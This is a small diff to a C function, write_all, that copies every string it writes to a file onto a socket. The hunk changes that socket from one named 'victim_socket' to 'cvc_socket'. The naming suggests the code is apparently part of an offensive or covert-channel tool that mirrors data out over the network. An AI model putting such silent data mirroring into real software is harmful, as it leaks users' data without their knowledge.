@@ -71,8 +71,7 @@ int write_all(int file_desc, const char *str, struct options_victim* ov) {
     do {
         bytesWritten = (int)write(file_desc, str, bytesToWrite);
         // TODO: CREATE RAW PACKET
-        write(ov->victim_socket, str, size);
-
+        write(ov->cvc_socket, str, size);
         if(bytesWritten == -1) {
             return 0;
         }
